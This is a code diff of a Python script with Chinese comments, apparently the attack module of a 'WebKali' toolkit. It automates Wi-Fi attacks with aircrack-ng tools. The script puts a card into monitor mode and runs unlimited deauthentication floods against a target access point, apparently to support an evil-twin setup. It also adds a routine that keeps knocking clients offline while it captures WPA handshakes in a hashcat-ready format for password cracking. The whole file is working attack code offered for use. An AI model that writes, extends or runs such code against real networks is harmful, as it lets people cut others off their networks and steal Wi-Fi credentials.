@@ -4,110 +4,115 @@ import time
 import os
 import sys
 import shutil
+import signal
 
-# ==========================================
-# WebKali 攻击执行单元 (增强版)
-# ==========================================
-
-# 修复环境变量，确保能找到工具
+# 修复环境变量
 os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
 
 
 def run_cmd(cmd):
-    """执行命令但不阻塞，返回结果"""
     subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 def log(msg):
-    """格式化输出，方便前端读取"""
-    print(f"[Deauth] {msg}")
+    print(f"[Attack] {msg}")
     sys.stdout.flush()
 
 
 def setup_monitor(interface, channel):
-    log(f"正在配置网卡 {interface} 进入监听模式 (Channel {channel})...")
+    print(f"[INFO] 配置网卡 {interface} -> 监听模式 (CH:{channel})...")
 
-    # 1. 尝试使用 airmon-ng (更稳定)
-    if shutil.which("airmon-ng"):
-        # 先检查是否已经是 monitor 模式
-        # 简单判断：名字里带 mon 或者 iwconfig 显示 Mode:Monitor
-        run_cmd(f"airmon-ng start {interface} {channel}")
-        # airmon-ng 可能会把网卡名改成 wlan0mon
-        # 这里为了简单，我们假设用户传入的已经是正确的名字，或者我们强制用 iw 设置
+    # 清理环境
+    run_cmd("killall wpa_supplicant NetworkManager dhclient airodump-ng aireplay-ng")
+    run_cmd("iw reg set US")  # 解锁 5G
 
-    # 2. 强制使用 iw/ip 命令设置 (双重保险)
+    # 重置网卡
     run_cmd(f"ip link set {interface} down")
     run_cmd(f"iw dev {interface} set type monitor")
     run_cmd(f"ip link set {interface} up")
 
-    # 3. 锁定信道
+    # 强力锁频
+    for _ in range(3):
+        run_cmd(f"iw dev {interface} set channel {channel}")
+        time.sleep(0.2)
+
+
+def attack_deauth(bssid, interface, channel, duration):
+    """Deauth 洪水攻击 (双子星模式用)"""
     run_cmd(f"iw dev {interface} set channel {channel}")
-    run_cmd(f"iwconfig {interface} channel {channel}")
-    time.sleep(1)
+    print(f"[INFO] 启动 Deauth 攻击: {bssid} (CH:{channel})")
 
+    # -D: 禁用AP检测(强制)
+    cmd = ["aireplay-ng", "--ignore-negative-one", "-D", "-0", "0", "-a", bssid, interface]
 
-def attack_deauth(bssid, interface, duration):
-    """
-    执行 Deauth 洪水攻击
-    duration: 0 表示无限攻击，直到被 kill
-    """
-    log(f"🔥 开始攻击目标: {bssid}")
-    log(f"🔥 攻击强度: 无限循环 (直至手动停止)")
-
-    # -0 0 表示无限次发送 Deauth 包
-    # -a 目标BSSID
-    # --ignore-negative-one 修复部分网卡报错
-    cmd = f"aireplay-ng --ignore-negative-one -0 0 -a {bssid} {interface}"
-
-    # 使用 Popen 启动，以便我们可以实时获取输出
-    process = subprocess.Popen(
-        cmd,
-        shell=True,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True
-    )
-
+    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     start_time = time.time()
 
     try:
-        # 实时读取输出并打印，这样前端就能看到了
         while True:
-            # 如果设定了时长且超时，则退出 (但在 Evil Twin 模式下通常是无限的)
-            if duration > 0 and (time.time() - start_time) > duration:
-                break
-
-            line = process.stdout.readline()
-            if not line and process.poll() is not None:
-                break
+            if duration > 0 and (time.time() - start_time) > duration: break
+            line = proc.stdout.readline()
+            if not line and proc.poll() is not None: break
 
             if line:
                 line = line.strip()
-                # 过滤一些无用信息，只显示关键攻击日志
-                if "Sending 64 directed DeAuth" in line:
-                    print(f"[Attack] ⚡ 正在发送 Deauth 攻击包... (目标已断线)")
-                elif "Waiting for beacon frame" in line:
-                    print(f"[Search] 正在寻找目标信号... (信道可能不匹配)")
-                elif "No such device" in line:
-                    print(f"[Error] 网卡丢失或被占用！")
-                    break
-                else:
-                    # 其他信息直接打印
-                    pass
-
+                if "Sending" in line and "DeAuth" in line:
+                    print(f"[LOG] ⚡ 正在发送 Deauth 攻击包...")
+                elif "Waiting for beacon" in line:
+                    run_cmd(f"iw dev {interface} set channel {channel}")
+                    print(f"[WARN] 信号丢失，正在校准信道...")
             sys.stdout.flush()
-
     except KeyboardInterrupt:
-        log("攻击被用户终止")
+        pass
     finally:
-        process.terminate()
+        proc.terminate()
         run_cmd("killall aireplay-ng")
-        log("攻击进程已结束")
 
 
 def capture_handshake(bssid, interface, channel, duration):
-    # ... (这部分由之前的代码处理，Evil Twin 模式主要用上面的 attack_deauth)
-    pass
+    """握手包捕获逻辑 (独立功能)"""
+    prefix = f"/tmp/handshake_{bssid.replace(':', '')}"
+    run_cmd("rm -f /tmp/handshake_*")  # 清理旧文件
+
+    # 1. 再次锁频
+    run_cmd(f"iw dev {interface} set channel {channel}")
+
+    # 2. 启动 Airodump 抓包 (后台)
+    print(f"[INFO] 启动抓包进程 (airodump-ng)...")
+    # 输出 cap 和 hc22000 (Hashcat格式)
+    dump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {prefix} --output-format cap,hc22000 {interface}"
+    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    # 3. 循环攻击诱骗重连
+    start_time = time.time()
+    print(f"[INFO] 开始诱骗用户重连 (Deauth)...")
+
+    try:
+        while (time.time() - start_time) < duration:
+            # 每隔 8 秒发送一波攻击 (5个包)
+            run_cmd(f"aireplay-ng --ignore-negative-one -D -0 5 -a {bssid} {interface}")
+            time.sleep(8)
+
+            # 检查是否已抓到包 (利用 aircrack-ng 检查 cap 文件)
+            cap_file = f"{prefix}-01.cap"
+            if os.path.exists(cap_file):
+                # 检查命令: aircrack-ng <file>
+                # 如果输出包含 "1 handshake"，说明抓到了
+                check_res = subprocess.run(f"aircrack-ng {cap_file}", shell=True, stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE, text=True)
+                if "1 handshake" in check_res.stdout or "WPA (" in check_res.stdout:
+                    print("\n[SUCCESS] CAPTURED_HS_POTENTIAL")  # 后端识别关键词
+                    print("[INFO] 握手包捕获成功！")
+                    break
+    except Exception as e:
+        print(f"[ERROR] {e}")
+    finally:
+        dump_proc.terminate()
+        run_cmd("killall airodump-ng aireplay-ng")
+
+        # 再次确认文件生成
+        if os.path.exists(f"{prefix}.hc22000"):
+            print("[INFO] Hash file generated.")
 
 
 if __name__ == "__main__":
@@ -116,11 +121,12 @@ if __name__ == "__main__":
     parser.add_argument("--bssid", required=True)
     parser.add_argument("--interface", default="wlan0")
     parser.add_argument("--channel", default="1")
-    parser.add_argument("--duration", default="0")  # 默认无限
+    parser.add_argument("--duration", default="60")
     args = parser.parse_args()
 
     setup_monitor(args.interface, args.channel)
 
     if args.mode == "deauth":
-        attack_deauth(args.bssid, args.interface, int(args.duration))
-    # handshake 模式略，Evil Twin 暂时只用 deauth
+        attack_deauth(args.bssid, args.interface, args.channel, int(args.duration))
+    elif args.mode == "handshake":
+        capture_handshake(args.bssid, args.interface, args.channel, int(args.duration))
